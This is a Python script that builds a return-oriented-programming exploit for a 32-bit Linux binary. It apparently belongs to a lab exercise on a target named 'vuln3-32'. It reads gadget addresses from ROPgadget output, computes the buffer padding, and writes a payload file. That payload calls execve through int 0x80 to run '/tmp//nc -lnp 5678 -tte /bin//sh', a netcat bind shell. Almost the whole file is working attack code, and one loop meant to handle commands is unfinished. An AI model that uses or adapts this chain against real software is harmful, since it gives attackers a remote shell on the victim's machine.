import sys, os,subprocess,re
from struct import pack
from getPadding import get_padding

# globals
ROP_PATH =  'ROPgadget'
ROP_OUT =  'out-rop.txt'
FILE = sys.argv[1]
COMMAND = sys.argv[2]

bashCommand = f"{ROP_PATH} --binary {FILE} --rochain > {ROP_OUT}"
print(f"executing command: {bashCommand}")

STACK_ADDRESS = 0x080d9060
STACK      = pack("<I", 0x080d9060) # @ .data 
INT80      = pack("<I", 0x080495f3) # int $0x80
MOVISTACK  = pack("<I", 0x08056cf5) # mov dword ptr [edx], eax ; ret
INCEAX     = pack("<I", 0x0807b6da) # inc %eax | ret 
# POPALL     = pack("<I", 0x0805ffda) # pop %edx | pop %ecx | pop %ebx | ret;
# 									# we are mainly interested in pop %ecx, thus there will be pre and post dummy data for %edx and %ebx 
POPEAX     = pack("<I", 0x080a89e6) # pop %eax | ret
POPEBX     = pack("<I", 0x080481c9) # pop %ebx | ret
POPECX     = pack("<I", 0x0806e262) # pop %ecx | ret
POPEDX     = pack("<I", 0x0806e23b) # pop %edx | ret

XOREAX     = pack("<I", 0x080562b0) # xor %eax,%eax | ret
DUMMY      = pack("<I", 0x42424242) # padding

with open(ROP_OUT) as rop_out_file:
    for line in rop_out_file:
        if 'Gadget found' in line:
            print(line)
            a = line.split(" ")
            if 'mov dword' in line:
                print(a[3], "MOVISTACK")
                MOVISTACK = pack("<I", int(a[3], 16))
            elif 'xor eax, eax' in line:
                print(a[3], "XOREAX")
                XOREAX = pack("<I", int(a[3], 16))
            elif 'inc eax ; ret' in line:
                print(a[3], "INCEAX")
                INCEAX = pack("<I", int(a[3], 16))
            elif 'pop eax ; ret' in line:
                print(a[3], "POPEAX")
                POPEAX = pack("<I", int(a[3], 16))
            elif 'pop ecx ; pop ebx ; ret' in line:
                print(a[3], "POPECX")
                POPECX = pack("<I", int(a[3], 16))
            elif 'pop ebx ; ret' in line:
                print(a[3], "POPEBX")
                POPEBX = pack("<I", int(a[3], 16))
            elif 'pop ecx ; ret' in line:
                print(a[3], "POPECX")   
                POPECX = pack("<I", int(a[3], 16))
            elif 'pop edx ; ret' in line:
                print(a[3], "POPEDX") 
                POPEDX = pack("<I", int(a[3], 16))
            elif 'int 0x80' in line:
                print(a[3], "INT80") 
                INT80 = pack("<I", int(a[3], 16))
        elif '@ .data\n' in line:
            a = re.split(" |\)", line)
            print(a[3], "STACK")
            STACK_ADDRESS = int(a[3], 16)
            STACK = pack("<I", int(a[3], 16))



padding_length = get_padding(FILE)
print("The padding length: ", padding_length)
outfile=open("nc.bin", "wb")
p = b'A'*padding_length # this is where we appended 44 characters.

#insert command
commands = []
with open(COMMAND) as commands_file:
    commands = commands_file.readline().split(" ")
OFFSET = 0
COMMAND_LEN = len(commands)
print("commands:", commands)
print("commands length:", COMMAND_LEN)

#insert command
for i in range(COMMAND_LEN):
    c = commands[i]
    [c[i:i+4] for i in range(0, len(c), 4)]


p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 0) # @ .data
p += POPEAX # pop eax ; ret
p += b'/tmp'
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 4) # @ .data + 4
p += POPEAX # pop eax ; ret
p += b'//nc'
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX #insert null
p += pack('<I', STACK_ADDRESS + 8)
p += XOREAX
p += MOVISTACK

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 9) # @ .data + 4
p += POPEAX # pop eax ; ret
p += b"-lnp"
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX #insert null
p += pack('<I', STACK_ADDRESS + 13)
p += XOREAX
p += MOVISTACK

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 14) # @ .data + 4
p += POPEAX # pop eax ; ret
p += b"5678"
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX #insert null
p += pack('<I', STACK_ADDRESS + 18)
p += XOREAX
p += MOVISTACK

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 19) # @ .data + 4
p += POPEAX # pop eax ; ret
p += b"-tte"
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX #insert null
p += pack('<I', STACK_ADDRESS + 23)
p += XOREAX
p += MOVISTACK

p += POPEDX  # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 24) # @ .data + 4
p += POPEAX # pop eax ; ret
p += b'/bin'
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 28) # @ .data + 4
p += POPEAX # pop eax ; ret
p += b'//sh'
p += MOVISTACK # mov dword ptr [edx], eax ; ret




#--------------
p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 40) # @ .data + 4
p += POPEAX # pop eax ; ret
p += STACK
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 44) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', STACK_ADDRESS + 9)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 48) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', STACK_ADDRESS + 14)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 52) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', STACK_ADDRESS + 19)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 56) # @ .data + 4
p += POPEAX # pop eax ; ret
p += pack('<I', STACK_ADDRESS + 24)
p += MOVISTACK # mov dword ptr [edx], eax ; ret

# ---------
p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 32) # @ .data + 8
p += XOREAX # xor eax, eax ; ret
p += MOVISTACK # mov dword ptr [edx], eax ; ret
p += POPEBX # pop ebx ; ret
p += STACK # @ .data
p += POPECX # pop ecx ; ret
p += pack('<I', STACK_ADDRESS + 40) # @ .data + 8
p += pack('<I', STACK_ADDRESS) # padding without overwrite ebx
p += POPEDX # pop edx ; ret
p += pack('<I', STACK_ADDRESS + 32) # @ .data + 8
p += INCEAX * 11
p += INT80 # int 0x80
outfile.write(p)
outfile.close()

# def get_padding(file_to_corrupt = "vuln3-32-test"):
#     #file_to_corrupt = "vuln3-32-test"
#     bashCommand = "gdb -x leakFindr.py -q " + file_to_corrupt

#     process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
#     output, error = process.communicate()
#     output = output.decode('utf-8').split("\n")
#     padding_str = [x for x in output if x.find('loc = ') > -1][0]
#     padding = int(padding_str[7:])
#     return padding

# if (__name__ == "__main__"):
#     padding = get_padding("vuln3-32")
#     print(padding)
